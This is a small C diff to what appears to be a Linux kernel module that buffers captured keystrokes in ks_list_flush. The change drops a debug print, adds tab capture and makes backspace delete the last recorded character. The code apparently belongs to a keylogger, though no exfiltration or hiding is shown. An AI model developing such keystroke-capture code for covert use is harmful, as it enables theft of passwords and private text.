@@ -228,11 +228,15 @@ static void		ks_list_flush(void)
 	memset(buf, 0, size + 1);
 
 	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
-		printk("%d\n", (int)ks->ascii);
 		ks->ascii = SWITCH_ASCII(ks->ascii);
 		if (ks->state == PRESSED && ((ks->ascii >= 32 && ks->ascii <= 127) 
-			|| ks->ascii == 10)) {
+			|| ks->ascii == 10 || ks->ascii == 9)) {
 			strncat(buf, (char *)&ks->ascii, 1);
+		}
+		else if (ks->state == PRESSED && ks->ascii == 8) {
+			size = strlen(buf);
+			size = ((size - 1) > 0) ? size - 1 : 0;
+			buf[size] = 0;
 		}
 		list_del(&ks->list);
 		kfree(ks);
